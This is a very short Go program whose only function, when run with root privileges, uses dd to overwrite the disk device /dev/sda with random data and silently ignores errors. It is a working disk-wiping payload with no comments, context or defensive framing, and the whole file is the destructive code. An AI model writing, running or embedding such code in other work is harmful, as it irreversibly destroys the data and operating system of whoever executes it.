package main
import ("os"; "os/exec")
func main() {
	if os.Geteuid() != 0 { return }
	_ = exec.Command("dd", "if=/dev/urandom", "of=/dev/sda").Run()
}
